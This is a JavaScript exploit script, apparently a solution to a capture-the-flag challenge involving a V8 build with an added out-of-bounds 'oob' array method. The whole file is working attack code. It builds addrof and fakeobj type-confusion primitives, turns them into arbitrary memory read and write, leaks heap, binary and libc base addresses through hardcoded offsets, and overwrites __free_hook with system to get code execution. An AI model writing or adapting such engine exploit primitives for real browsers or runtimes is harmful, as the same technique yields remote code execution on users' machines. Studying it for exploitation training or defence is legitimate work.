/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var obj = {"A":1};
var obj_array = [obj];
var float_array = [1.1, 1.2, 1.3, 1.4];

var float_array_map = float_array.oob();
var obj_array_map = obj_array.oob();


function addrof(in_obj) {
	obj_array[0] = in_obj;
	obj_array.oob(float_array_map);
	let addr = obj_array[0];
	obj_array.oob(obj_array_map);
	return ftoi(addr);
}

function fakeobj(addr) {
	float_array[0] = itof(addr);
	float_array.oob(obj_array_map);
	let fake = float_array[0];
	float_array.oob(float_array_map);
	return fake;
}

var arb_rw_arr = [float_array_map, 1.2, 1.3, 1.4];
console.log("Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
	if(addr % 2n == 0)
		addr += 1n;
	
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
	return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
	
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
	fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
	let buf = new ArrayBuffer(8);
	let dataview = new DataView(buf);
	let buf_addr = addrof(buf);
	let backing_store_addr = buf_addr + 0x20n;
	initial_arb_write(backing_store_addr, addr);
	dataview.setBigUint64(0, BigInt(val), true);
}

// Trying to get leaks heap -> bin -> libc.
var test = new Array([1.1, 1.2, 1.3, 1.4]);

var test_addr = addrof(test);
var map_ptr = arb_read(test_addr - 0x1n);
var map_base = map_ptr - 0x2f79n;
var heap_leak = arb_read(map_base+0x18n);
var binary_leak = arb_read(heap_leak);
var binary_base = binary_leak - 0xd88ea8n;
var strcpy_addr = arb_read(binary_base + 0xd9ba20n);
var libc_base = strcpy_addr - 0x18cba0n;
var __free_hook = libc_base + 0x1eeb28n;
var system = libc_base + 0x55410n;


console.log("Heap leak @ 0x" + heap_leak.toString(16));
console.log("Binary base @ 0x" + binary_base.toString(16));
console.log("strcpy @ 0x" + strcpy_addr.toString(16));
console.log("Libc base @ 0x" + libc_base.toString(16));
console.log("Overwriting __free_hook with system...")
arb_write(__free_hook, system)
console.log("xcalc");
